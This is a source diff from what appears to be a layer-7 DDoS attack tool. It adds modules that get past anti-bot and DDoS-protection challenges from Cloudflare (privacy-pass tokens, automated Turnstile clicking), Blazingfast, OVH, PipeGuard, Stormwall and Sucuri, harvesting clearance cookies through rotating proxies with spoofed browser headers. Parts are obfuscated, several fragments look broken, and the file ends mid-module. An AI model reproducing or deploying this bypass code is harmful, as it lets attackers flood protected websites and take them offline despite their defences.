@@ -10,148 +10,6 @@
 const errorHandler = error => {
 
 module.exports = function Cloudflare() {
-    const privacypass = require('./privacyss'),
-        cloudscraper = require('cloudscraper'),
-        request = require('request'),
-        fs = require('fs');
-    var privacyPassSupport = true;
-    function useNewToken() {
-        privacypass(l7.target);
-        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
-    }
-
-    if (l7.firewall[1] == 'captcha') {
-        privacyPassSupport = l7.firewall[2];
-        useNewToken();
-    }
-
-    function bypass(proxy, uagent, callback, force) {
-        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
-        var cookie = "";
-        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
-            request.get({
-                url: l7.target + "?_asds=" + num,
-                gzip: true,
-                proxy: proxy,
-                headers: {
-                    'Connection': 'Keep-Alive',
-                    'Cache-Control': 'max-age=0',
-                    'Upgrade-Insecure-Requests': 1,
-                    'User-Agent': uagent,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Accept-Language': 'en-US;q=0.9'
-                }
-            }, (err, res) => {
-                if (!res) {
-                    return false;
-                }
-                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {
-
-                } else {
-                    if (l7.firewall[1] == 'captcha') {
-                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
-                        return false;
-                    } else {
-                        privacyPassSupport = false;
-                    }
-                }
-
-                cookie = res.headers['set-cookie'].shift().split(';').shift();
-                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
-                    cloudscraper.get({
-                        url: l7.target + "?_asds=" + num,
-                        gzip: true,
-                        proxy: proxy,
-                        headers: {
-                            'Connection': 'Keep-Alive',
-                            'Cache-Control': 'max-age=0',
-                            'Upgrade-Insecure-Requests': 1,
-                            'User-Agent': uagent,
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-                            'Accept-Encoding': 'gzip, deflate, br',
-                            'Accept-Language': 'en-US;q=0.9',
-                            'challenge-bypass-token': l7.privacypass,
-                            "Cookie": cookie
-                        }
-                    }, (err, res) => {
-                        if (err || !res) return false;
-                        if (res.headers['set-cookie']) {
-                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
-                            cloudscraper.get({
-                                url: l7.target + "?_asds=" + num,
-                                proxy: proxy,
-                                headers: {
-                                    'Connection': 'Keep-Alive',
-                                    'Cache-Control': 'max-age=0',
-                                    'Upgrade-Insecure-Requests': 1,
-                                    'User-Agent': uagent,
-                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-                                    'Accept-Encoding': 'gzip, deflate, br',
-                                    'Accept-Language': 'en-US;q=0.9',
-                                    "Cookie": cookie
-                                }
-                            }, (err, res, body) => {
-                                if (err || !res || res && res.statusCode == 403) {
-                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
-                                    useNewToken();
-                                    return;
-                                }
-                                callback(cookie);
-                            });
-                        } else {
-                            console.log(res.statusCode, res.headers);
-                            if (res.headers['cf-chl-bypass-resp']) {
-                                let respHeader = res.headers['cf-chl-bypass-resp'];
-                                switch (respHeader) {
-                                    case '6':
-                                        console.warn("[privacy-pass]: internal server connection error occurred");
-                                        break;
-                                    case '5':
-                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
-                                        useNewToken();
-                                        break;
-                                    case '7':
-                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
-                                        break;
-                                    case '8':
-                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
-                                        break;
-                                }
-                                return bypass(proxy, uagent, callback, true);
-                            }
-                        }
-                    });
-                } else {
-                    cloudscraper.get({
-                        url: l7.target + "?_asds=" + num,
-                        proxy: proxy,
-                        headers: {
-                            'Connection': 'Keep-Alive',
-                            'Cache-Control': 'max-age=0',
-                            'Upgrade-Insecure-Requests': 1,
-                            'User-Agent': uagent,
-                            'Accept-Language': 'en-US;q=0.9'
-                        }
-                    }, (err, res) => {
-                        if (err || !res || !res.request.headers.cookie) {
-                            if (err) {
-                                if (err.name == 'CaptchaError') {
-                                    return bypass(proxy, uagent, callback, true);
-                                }
-                            }
-                            return false;
-                        }
-                        callback(res.request.headers.cookie);
-                    });
-                }
-            });
-        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
-            cloudscraper.get({
-                url: l7.target + "?_asds=" + num,
-                proxy: proxy,
-                headers: {
-module.exports = function Cloudflare() {
   const _0x4dd1a2 = require("./privacypass");
   const _0x229dc0 = require("cloudscraper");
   const _0x48c180 = require('request');
@@ -336,6 +194,830 @@ module.exports = function Cloudflare() {
     }
   }
   return _0x4baa52;
+}
+
+module.exports = function Cloudflare() {
+    const request = require('request'),
+    requestJar = request.jar(),
+        cloudscraper = require('./cloudfare_bypasser/').defaults({
+        jar: requestJar
+    });
+const randomstring = require("randomstring");
+    function bypass(proxy, uagent, callback, force) {
+            var ip = randomByte() +'.' +
+            randomByte() +'.' +
+            randomByte() +'.' +
+            randomByte();
+
+                    var rand = randomstring.generate({
+            length: 12,
+            charset: 'mareskizocbteam/2/2/2/2abcdefghijklmnopqstuvwxyz0123456789/ccl/ss'
+          });
+
+        var cookie = "";
+
+                cloudscraper.get({
+                uri: l7.parsed.protocol + '//' + l7.parsed.host + '/jquery.min.js',
+                proxy: proxy,
+                method: "GET",
+                headers: {
+                    'Connection': 'Keep-Alive',
+                    'Cache-Control': 'max-age=0',
+                    'Upgrade-Insecure-Requests': 1,
+                    'User-Agent': uagent,
+                    'DNT': 1,
+                    'Referer': l7.target,
+                    'Cookie': cookie,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Accept-Language': 'en-US;q=0.9',
+                    'Content-Type': 'application/json'
+                }
+            }, (err, res, body) => {
+                if (err || !res || !body || !res.headers['set-cookie']) {
+                    if (res && body && res.headers.server == 'cloudflare' && res.requestMethod !== POST && res.statusCode !== 200) {
+                        if (res.headers['set-cookie'][0].startsWith('__cfduid=' + /(.*)/)){
+                            console.log('Cookies: ', cookie);
+                            return bypass;
+                        }
+                        return bypass(proxy, uagent, callback, true);
+                    }
+                    return true;
+                }
+                cookie = res.headers['set-cookie'].shift().split(';').shift();
+                callback(cookie);
+            });
+}
+    return bypass;
+}
+
+module.exports = function Browser() {
+    const request = require('request'),
+    requestJar = request.jar(),
+        multi_bypasser = require('./multi_bypasser/').defaults({
+        jar: requestJar
+    });
+
+    function bypass(proxy, uagent, callback, force) {
+        var cookie = "";
+            multi_bypasser.get({
+                uri: l7.target,
+                proxy: proxy,
+                headers: {
+                    'Connection': 'Keep-Alive',
+                    'Cache-Control': 'max-age=0',
+                    'Upgrade-Insecure-Requests': 1,
+                    'User-Agent': uagent,
+                    'DNT': 1,
+                    'Referer': l7.refer2,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Accept-Language': 'en-US;q=0.9'
+                }
+            }, (err, res, body) => {
+                if (err || !res || !body || !res.headers['set-cookie']) {
+                    if (res && body && /One more step/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
+                        return bypass(proxy, uagent, callback, true);
+                    }
+                    return true;
+                }
+                cookie = res.headers['set-cookie'].shift().split(';').shift();
+                callback(cookie);
+            });
+
+        }
+    return bypass;
+}
+async function captchaSolver(page, context, response) {
+    log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Detected protection -> ` + `CloudFlare (JS)`.green);
+
+    for (let i = 0; i < 15; i++) {
+        (async () => {
+            await page.waitForTimeout(1000);
+            await page.mouse.move(randomIntFromInterval(10, 230), randomIntFromInterval(10, 230))
+        })
+    }
+
+    if (await page.title() === "Just a moment...") {
+        const hcaptcha_box = await page.locator('//*[@id="turnstile-wrapper"]/div');   // Looking for captcha button
+
+        if (hcaptcha_box) {
+            let x;
+            let y;
+            let captchaDetect = false;
+
+            try {
+                const rect = await hcaptcha_box.boundingBox();
+                x = rect.x + rect.width / 2;
+                y = rect.y + rect.height / 2;
+
+                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Managed challenge -> ` + `Detected captcha`.green);
+                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Detected element -> ` + `[ captcha box ]`.green);
+
+                captchaDetect = true;
+            } catch (e) {
+                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Managed challenge -> ` + `UAM`.green);
+                await page.waitForTimeout(15000);
+
+                if (await page.title() === "Just a moment...") {
+                    await page.waitForTimeout(15000);
+
+
+                    if (await page.title() === "Just a moment...") {
+                        await page.waitForTimeout(15000);
+                    }
+                }
+            }
+
+            if (captchaDetect) {
+                await page.mouse.click(x, y);
+
+                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+
+                await page.waitForTimeout(10000);
+
+                if (await page.title() === "Just a moment...") {
+                    await page.waitForTimeout(3000);
+                    await page.mouse.click(x, y);
+                    log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                    await page.waitForTimeout(10000);
+
+                    if (await page.title() === "Just a moment...") {
+                        await page.waitForTimeout(3000);
+                        await page.mouse.click(x, y);
+                        log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                        await page.waitForTimeout(10000);
+
+                        if (await page.title() === "Just a moment...") {
+                            await page.waitForTimeout(3000);
+                            await page.mouse.click(x, y);
+                            log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                            await page.waitForTimeout(10000);
+
+                            if (await page.title() === "Just a moment...") {
+                                await page.waitForTimeout(3000);
+                                await page.mouse.click(x, y);
+                                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                                await page.waitForTimeout(10000);
+
+                                if (await page.title() === "Just a moment...") {
+                                    await page.waitForTimeout(3000);
+                                    await page.mouse.click(x, y);
+                                    log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                                    await page.waitForTimeout(10000);
+
+                                    if (await page.title() === "Just a moment...") {
+                                        await page.waitForTimeout(3000);
+                                        await page.mouse.click(x, y);
+                                        log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                                        await page.waitForTimeout(10000);
+
+                                        if (await page.title() === "Just a moment...") {
+                                            await page.waitForTimeout(3000);
+                                            await page.mouse.click(x, y);
+                                            log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                                            await page.waitForTimeout(10000);
+
+                                            if (await page.title() === "Just a moment...") {
+                                                await page.waitForTimeout(3000);
+                                                await page.mouse.click(x, y);
+                                                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                                                await page.waitForTimeout(10000);
+
+                                                if (await page.title() === "Just a moment...") {
+                                                    await page.waitForTimeout(3000);
+                                                    await page.mouse.click(x, y);
+                                                    log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
+                                                    await page.waitForTimeout(10000);
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    } else {
+        log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Managed challenge -> ` + `UAM`.green);
+        await page.waitForTimeout(15000);
+    }
+
+    const title = await page.title();
+    const cookies = (await context.cookies()).map(c => `${c.name}=${c.value}`).join('; ');
+    const headers = await response.request().allHeaders();
+    const headerEntries = Object.entries(headers);
+
+    return [title, cookies, headerEntries];
+}
+
+function initialize() { }
+
+module.exports = {
+    initialize: initialize,
+    captchaSolver: captchaSolver
+};
+
+module.exports = function Blazingfast() {
+    const request = require('request'),
+        BFCrypt = require('./bfcrypt'),
+        cloudscraper = require('./multi_bypasser/').defaults({
+            agentOptions: {
+                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
+            }
+        }),
+        safeEval = require('safe-eval');
+
+    function randomScreenWidth() {
+        return ~~(Math.random() * (2560 - 1024) + 1024)
+    }
+
+    function toNumbers(d) {
+        var e = [];
+        d.replace(/(..)/g, function (d) {
+            e.push(parseInt(d, 16))
+        });
+        return e
+    }
+
+    function toHex() {
+        for (var d = [], d = 1 == arguments.length && arguments[0].constructor == Array ? arguments[0] : arguments, e = "", f = 0; f <
+            d.length; f++) e += (16 > d[f] ? "0" : "") + d[f].toString(16);
+        return e.toLowerCase()
+    }
+
+    let document = {
+        cookie: ''
+    }
+
+    function atob(string) {
+        return Buffer.from(string, 'base64').toString('ascii');
+    }
+    
+    return async function cookie(proxy, uagent, callback) {
+        var cookie = "";
+        if (l7.firewall[1] === '5sec') {
+            request.get({
+                url: l7.parsed.protocol + '//' + l7.parsed.host,
+                gzip: true,
+                proxy: proxy,
+                headers: {
+                    'User-Agent': uagent,
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'max-age=0',
+                    'Upgrade-Insecure-Requests': 1,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'en-US,en;q=0.9'
+                }
+            }, async (err, res, body) => {
+                if (!res || !res.headers['set-cookie'] || !body || body.indexOf(',true),xhr') == -1) {
+                    return false;
+                }
+                cookie = res.headers['set-cookie'].shift().split(';').shift();
+                let url = l7.parsed.protocol + '//' + l7.parsed.host + '/blzgfst-shark/?bfu=&blazing_answer=' + encodeURI(body.split('r.value = "')[1].split("\";var _0xf8c2=['value'];")[0]) + '&blazing_answer=' + safeEval(body.split("return _0x8cc65;};a[_0x2f8c('0x0')]=")[1].split(';')[0]);
+                await request.get({
+                    url: l7.parsed.protocol + '//' + l7.parsed.host + '/jquery.min.js',
+                    proxy: proxy,
+                    gzip: true,
+                    headers: {
+                        'Connection': 'keep-alive',
+                        'User-Agent': uagent,
+                        'Accept': '*/*',
+                        'DNT': 1,
+                        'Referer': l7.target,
+                        'Accept-Encoding': 'gzip, deflate',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Cookie': cookie
+                    }
+                }, async (err, res, body) => {
+                    if (err || !res || !body) {
+                        return false;
+                    }
+                    await request.get({
+                        url,
+                        proxy: proxy,
+                        gzip: true,
+                        headers: {
+                            'Connection': 'keep-alive',
+                            'User-Agent': uagent,
+                            'Accept': '*/*',
+                            'DNT': 1,
+                            'Referer': l7.parsed.protocol + '//' + l7.parsed.host,
+                            'Accept-Encoding': 'gzip, deflate',
+                            'Accept-Language': 'en-US,en;q=0.5',
+                            'Cookie': cookie
+                        }
+                    }, (err, res, body) => {
+                        if (err || !body || body.indexOf('if($(window).width()>0) { document.cookie=') == -1 || !res) return false;
+                        let chl = 'var a=toNumbers' + body.split('var a=toNumbers')[1].replace(' if($(window).width()>0) { document.cookie=', 'document.cookie=').split('+"; domain =')[0]
+                        let final = cookie + '; ' + eval(chl);
+                        callback(final);
+                    });
+                });
+            });
+        } else if (['5sec2'].indexOf(l7.firewall[1]) !== -1) {
+            setTimeout(() => {
+                cloudscraper.get({
+                    url: l7.parsed.protocol + '//' + l7.parsed.host,
+                    gzip: true,
+                    proxy: proxy,
+                    headers: {
+                        'User-Agent': uagent,
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'no-cache',
+                        'Pragma': 'no-cache',
+                        'Upgrade-Insecure-Requests': 1,
+                        'Cache-Control': 'no-cache',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.9'
+                    }
+                }, async (err, res, body) => {
+                    if (!res || !res.headers['set-cookie'] || !body || body.indexOf('r.value = "') == -1) {
+                        return false;
+                    }
+                    let url = l7.parsed.protocol + '//' + l7.parsed.host + '/blzgfst-shark/?bfu=&blazing_answer=' + encodeURI(body.split('r.value = "')[1].split("\";var _0xf8c2=['value'];")[0]) + '&blazing_answer=' + safeEval(body.split("return _0x8cc65;};a[_0x2f8c('0x0')]=")[1].split(';')[0]);
+                    cookie = res.headers['set-cookie'].shift().split(';').shift();
+                    await cloudscraper.get({
+                        url,
+                        gzip: true,
+                        proxy: proxy,
+                        followAllRedirects: true,
+                        jar: true,
+                        headers: {
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            'Connection': 'keep-alive',
+                            'User-Agent': uagent,
+                            'Referer': l7.target,
+                            'Pragma': 'no-cache',
+                            'Cache-Control': 'no-cache',
+                            'Upgrade-Insecure-Requests': 1,
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Accept-Language': 'en-US,en;q=0.5',
+                            'TE': 'Trailers',
+                            'Cookie': cookie
+                        }
+                    }, (err, res, body) => {
+                        if (err || !res) return false;
+                        let final = res.request.headers.Cookie;
+                        callback(final);
+                    });
+                });
+            }, 5e3);
+
+        };
+    }
+}
+
+module.exports = function OVHUAM() {
+    const request = require('request');
+
+    function Bypasser(body, callback) {
+        callback('xf_id=' + body.match(/\|max\|(.*?)\|/)[1]);
+    }
+
+    return function bypass(proxy, uagent, callback) {
+        request({
+            url: l7.target,
+            method: "GET",
+            gzip: true,
+            proxy: proxy,
+            headers: {
+                'Connection': 'keep-alive',
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': 1,
+                'User-Agent': uagent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US'
+            }
+        }, (err, res, body) => {
+            if (err || !res || !body || body.indexOf('|href|max|') == -1) {
+                return false;
+            }
+            Bypasser(body, cookies => {
+                request({
+                    url: l7.target,
+                    method: "GET",
+                    gzip: true,
+                    proxy: proxy,
+                    followAllRedirects: true,
+                    jar: true,
+                    headers: {
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'max-age=0',
+                        'Upgrade-Insecure-Requests': 1,
+                        'User-Agent': uagent,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Cookie': cookies
+                    }
+                }, (err, res, body) => {
+                    if (res && res.request.headers.Cookie) {
+                        //console.log(res.request.headers.Cookie);
+                        callback(res.request.headers.Cookie);
+                    }
+                    /*if (err || !res || !body) {
+                        return false;
+                    }*/
+                });
+            })
+        });
+    }
+}
+
+module.exports = function PipeGuard() {
+    const request = require('request');
+
+    function Bypasser(body, callback) {
+        callback(body.match(/PipeGuard=([^\\s;]*)/)[0]);
+    }
+
+    return function bypass(proxy, uagent, callback) {
+        request({
+            url: l7.target,
+            method: "GET",
+            gzip: true,
+            followAllRedirects: true,
+            jar: true,
+            proxy: proxy,
+            headers: {
+                'Connection': 'keep-alive',
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': 1,
+                'User-Agent': uagent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9'
+            }
+        }, (err, res, body) => {
+            if (err || !res || !body || body.indexOf('document.cookie = "PipeGuard=') == -1) {
+                return false;
+            }
+            Bypasser(body, cookies => {
+                request({
+                    url: l7.target,
+                    method: "GET",
+                    gzip: true,
+                    proxy: proxy,
+                    followAllRedirects: true,
+                    jar: true,
+                    headers: {
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'max-age=0',
+                        'Upgrade-Insecure-Requests': 1,
+                        'User-Agent': uagent,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Cookie': cookies
+                    }
+                }, (err, res, body) => {
+                    if (res && res.request.headers.Cookie) {
+                        //console.log(res.request.headers.Cookie);
+                        callback(res.request.headers.Cookie);
+                    }
+                    /*if (err || !res || !body) {
+                        return false;
+                    }*/
+                });
+            })
+        });
+    }
+}
+
+module.exports = function Stormwall() {
+    const request = require('cloudscraper'),
+        document = {
+            cookie: ''
+        };
+
+    global.window = {navigator: {}};
+
+    var BYPASSIT = {};
+
+    var _0xda3f = ['__phantom', 'Buffer', 'emit', 'spawn', 'domAutomation', 'webdriver', 'selenium', './adv', '0123456789qwertyuiopasdfghjklzxcvbnm:?!', 'toString', 'getElementById', 'className', 'error-frame', 'invisible', 'undefined', 'location', 'Cannot\x20find\x20module\x20\x27', 'MODULE_NOT_FOUND', 'exports', 'function', 'length', '_phantom'];
+    (function (_0x502b53, _0x2696a0) {
+        var _0xe3cb5a = function (_0x4f70f6) {
+            while (--_0x4f70f6) {
+                _0x502b53['push'](_0x502b53['shift']());
+            }
+        };
+        _0xe3cb5a(++_0x2696a0);
+    }(_0xda3f, 0xec));
+    var _0xfda3 = function (_0x3854ba, _0x105aa1) {
+        _0x3854ba = _0x3854ba - 0x0;
+        var _0x36d4c9 = _0xda3f[_0x3854ba];
+        return _0x36d4c9;
+    };
+    (function e(_0x33f0ce, _0x4e1686, _0x58a80c) {
+        function _0x23a0c0(_0x4bc934, _0x149a56) {
+            if (!_0x4e1686[_0x4bc934]) {
+                if (!_0x33f0ce[_0x4bc934]) {
+                    var _0x37652d = typeof require == 'function' && require;
+                    if (!_0x149a56 && _0x37652d) return _0x37652d(_0x4bc934, !0x0);
+                    if (_0x7bb490) return _0x7bb490(_0x4bc934, !0x0);
+                    var _0x36dc71 = new Error(_0xfda3('0x0') + _0x4bc934 + '\x27');
+                    throw _0x36dc71['code'] = _0xfda3('0x1'), _0x36dc71;
+                }
+                var _0x43a010 = _0x4e1686[_0x4bc934] = {
+                    'exports': {}
+                };
+                _0x33f0ce[_0x4bc934][0x0]['call'](_0x43a010['exports'], function (_0x316792) {
+                    var _0x4e1686 = _0x33f0ce[_0x4bc934][0x1][_0x316792];
+                    return _0x23a0c0(_0x4e1686 ? _0x4e1686 : _0x316792);
+                }, _0x43a010, _0x43a010[_0xfda3('0x2')], e, _0x33f0ce, _0x4e1686, _0x58a80c);
+            }
+            return _0x4e1686[_0x4bc934][_0xfda3('0x2')];
+        }
+        var _0x7bb490 = typeof require == _0xfda3('0x3') && require;
+        for (var _0x46655c = 0x0; _0x46655c < _0x58a80c[_0xfda3('0x4')]; _0x46655c++) _0x23a0c0(_0x58a80c[_0x46655c]);
+        return _0x23a0c0;
+    }({
+        1: [function (_0xdc5b45, _0x14d549, _0x102643) {
+            let _0x4713ba = {
+                'a': window['callPhantom'],
+                'b': window[_0xfda3('0x5')],
+                'c': window[_0xfda3('0x6')],
+                'd': window[_0xfda3('0x7')],
+                'e': window[_0xfda3('0x8')],
+                'f': window[_0xfda3('0x9')],
+                'g': window['webdriver'],
+                'h': window[_0xfda3('0xa')],
+                'i': window['navigator'][_0xfda3('0xb')],
+                'j': window[_0xfda3('0xc')],
+                'k': window['navigator']['selenium']
+            };
+
+            function _0x587e9b() {
+                for (let _0x227d72 in _0x4713ba) {
+                    if (_0x4713ba[_0x227d72]) {
+                        return !![];
+                    }
+                }
+                return ![];
+            }
+            _0x14d549[_0xfda3('0x2')] = _0x587e9b;
+        }, {}],
+        2: [function (_0x5ea793, _0x57a229, _0x533365) {
+            let _0x80ea80 = _0x5ea793(_0xfda3('0xd'));
+            let _0x249dc6 = _0xfda3('0xe');
+            let _0x34900d = [];
+            let _0x40d702 = {};
+
+            function _0x2aadcb(_0x93c8ef) {
+                for (let _0x4680bf = 0x0; _0x4680bf < _0x93c8ef[_0xfda3('0x4')]; _0x4680bf++) {
+                    _0x34900d[_0x4680bf] = _0x93c8ef[_0x4680bf];
+                    _0x40d702[_0x93c8ef[_0x4680bf]] = _0x4680bf;
+                }
+            }
+
+            function _0x54a7c6(_0x15ddb9, _0x1bbdda) {
+                let _0x12d568 = _0x34900d[_0xfda3('0x4')] - 0x1;
+                let _0x59a887 = '';
+                for (let _0x42faad = 0x0; _0x42faad < _0x1bbdda[_0xfda3('0x4')]; _0x42faad++) {
+                    let _0x2ee74c = _0x1bbdda[_0x42faad];
+                    if (typeof _0x40d702[_0x2ee74c] == 'undefined') {
+                        _0x59a887 = _0x59a887 + _0x2ee74c;
+                    } else {
+                        let _0x5ad52a = _0x40d702[_0x2ee74c] + _0x15ddb9;
+                        if (_0x5ad52a > _0x12d568) {
+                            _0x5ad52a = _0x5ad52a - _0x12d568 - 0x1;
+                        } else if (_0x5ad52a < 0x0) {
+                            _0x5ad52a = _0x12d568 + _0x5ad52a + 0x1;
+                        }
+                        _0x59a887 = _0x59a887 + _0x34900d[_0x5ad52a];
+                    }
+                }
+                return _0x59a887;
+            }
+
+            function _0xa0449d(_0x38d428, _0x4ea9f5) {
+                let _0x545320 = _0x34900d[_0xfda3('0x4')] - 0x1;
+                let _0xef2535 = _0x38d428;
+                let _0x1e15a8 = '';
+                for (let _0x2c0ae9 = 0x0; _0x2c0ae9 < _0x4ea9f5[_0xfda3('0x4')]; _0x2c0ae9++) {
+                    let _0x2b84b7 = '' + _0x4ea9f5[_0x2c0ae9];
+                    _0x1e15a8 = _0x1e15a8 + _0x54a7c6(_0xef2535, _0x2b84b7);
+                    _0xef2535 = _0xef2535 + 0x1;
+                    if (_0xef2535 > _0x545320) {
+                        _0xef2535 = 0x0;
+                    }
+                }
+                return _0x1e15a8;
+            }
+
+            function _0x2677f6(_0xc6fb9a, _0x16eaa6) {
+                let _0x5499f5 = _0x34900d[_0xfda3('0x4')] - 0x1;
+                let _0x2d5b44 = _0xc6fb9a;
+                let _0x2e8bf8 = '';
+                if (_0x80ea80()) {
+                    _0x2e8bf8 += Date['new']()[_0xfda3('0xf')]();
+                    res += ':';
+                }
+                for (let _0x39e246 = 0x0; _0x39e246 < _0x16eaa6[_0xfda3('0x4')]; _0x39e246++) {
+                    let _0x38946d = '' + _0x16eaa6[_0x39e246];
+                    _0x2e8bf8 = _0x2e8bf8 + _0x54a7c6(_0x2d5b44 * -0x1, _0x38946d);
+                    _0x2d5b44 = _0x2d5b44 + 0x1;
+                    if (_0x2d5b44 > _0x5499f5) {
+                        _0x2d5b44 = 0x0;
+                    }
+                }
+                return _0x2e8bf8;
+            }
+
+            let _0x474992 = 0x0;
+            if (typeof googleAnal != _0xfda3('0x14') || typeof yaMetrika != _0xfda3('0x14')) _0x474992 = 0x3e8;
+            _0x2aadcb(_0x249dc6);
+            BYPASSIT = function (defines) {
+                return eval(defines + '; document.cookie = cN + \'=\' + _0x2677f6(cK, cE)');
+            }
+        }, {
+            './adv': 0x1
+        }]
+    }, {}, [0x2]));
+
+    function Bypasser(body) {
+        return new Promise((resolve, reject) => {
+            resolve(BYPASSIT(body.split('<script>')[2].split('</script>')[0])); // Wallah return the bypass cookie;
+        });
+    }
+
+    return function bypass(proxy, uagent, callback) {
+        request({
+            method: "GET",
+            url: l7.target,
+            gzip: true,
+            proxy: proxy,
+            followAllRedirects: true,
+            headers: {
+                'Connection': 'keep-alive',
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': 1,
+                'User-Agent': uagent,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9'
+            }
+        }, (err, res, body) => {
+            if (err || !res || !body || body.indexOf('const cN = ') == -1) {
+                if (body && body.indexOf('Your browser cannot be verified automatically, please confirm you are not a robot.') !== -1) {
+                    return logger('[stormwall] Captcha received, IP reputation died.');
+                }
+                return false;
+            }
+            Bypasser(body).then(cookie => {
+                request({
+                    method: "GET",
+                    url: l7.target,
+                    gzip: true,
+                    proxy: proxy,
+                    followAllRedirects: true,
+                    headers: {
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'max-age=0',
+                        'Upgrade-Insecure-Requests': 1,
+                        'User-Agent': uagent,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        "Cookie": cookie
+                    }
+                }, (err, res, body) => {
+                    if (err || !res) {
+                        return false;
+                    }
+                    //console.log(cookie, body);
+                    callback(cookie);
+                })
+            });
+        });
+    }
+}
+
+module.exports = function Sucuri() {
+    const request = require('request'),
+        vm = require('vm'),
+        CHALLENGE_REGEXP = /<script>([^]+?)<\/script>/,
+        COOKIE_REGEXP = /(sucuri_cloudproxy_uuid_[0-9a-f]{9})=([0-9a-f]{32});?/,
+        cloudscraper = require('cloudscraper').defaults({
+            agentOptions: {
+                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
+            }
+        });
+
+    function createEnvironment(cookieCallback) {
+        var document = {};
+        Object.defineProperty(document, 'cookie', {
+            set: value => cookieCallback(value)
+        });
+
+        var location = {
